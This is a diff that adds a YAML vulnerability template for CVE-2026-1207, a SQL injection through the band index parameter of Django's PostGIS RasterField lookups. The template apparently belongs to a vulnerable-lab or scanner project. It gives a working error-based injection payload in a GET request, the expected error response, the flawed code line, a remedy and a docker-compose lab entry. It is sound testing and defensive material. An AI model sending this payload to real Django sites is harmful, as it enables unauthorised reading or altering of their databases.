@@ -1,0 +1,72 @@
+id: vt-2026-1207
+
+info:
+  name: "Django SQL Injection in RasterField lookup (CVE-2026-1207)"
+  author: omarkurt
+  description: |
+    An issue was discovered in Django 6.0 before 6.0.2, 5.2 before 5.2.11, and 4.2 before 4.2.28.
+    Raster lookups on ``RasterField`` (only implemented on PostGIS) allows remote attackers to inject SQL via the band index parameter.
+  targets:
+    - django
+  type: CVE
+  cve: CVE-2026-1207
+  cwe: CWE-89
+  cvss:
+    score: 8.1
+    severity: high
+  affected_versions:
+    - "< 6.0.2"
+    - "< 5.2.11"
+    - "< 4.2.28"
+  tags:
+    - sqli
+    - django
+    - postgis
+    - injection
+
+vulnerabilities:
+  endpoint: /
+  method: GET
+  param: band
+  request: |
+    GET /?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)%20-- HTTP/1.1
+    Host: {{target}}
+  response: |
+    HTTP/1.1 500 Internal Server Error
+
+    Error: invalid input syntax for type integer: "PostgreSQL 15.4 ..."
+
+technical: |
+  SQL Injection in PostGISOperator.check_raster method.
+  File: django/contrib/gis/db/backends/postgis/operations.py
+
+  The band_lhs/band_rhs parameters are concatenated directly into SQL via
+  string formatting (%s) instead of parameterized queries:
+    template_params["rhs"] = "%s, %s" % (template_params["rhs"], lookup.band_rhs)
+
+  Payload: 1) AND 1=CAST((SELECT version()) AS INT) --
+  This closes the ST_Intersects function and injects arbitrary SQL.
+
+impact: |
+  Attackers can execute arbitrary SQL commands on the PostGIS database,
+  potentially leading to data extraction, modification, or deletion.
+
+remedy: |
+  Update Django to version 6.0.2, 5.2.11, or 4.2.28.
+  Alternatively, validate band index parameter to ensure it's an integer.
+
+references:
+  - "https://nvd.nist.gov/vuln/detail/CVE-2026-1207"
+  - "https://www.djangoproject.com/weblog/2026/feb/04/security-releases/"
+  - "https://github.com/django/django/security/advisories"
+
+poc:
+  nuclei:
+    - "vt-2026-1207.nuclei.yaml"
+  bambda:
+    - "vt-2026-1207.bambda"
+
+providers:
+  docker-compose:
+    path: "docker-compose.yaml"
+    port: 8000
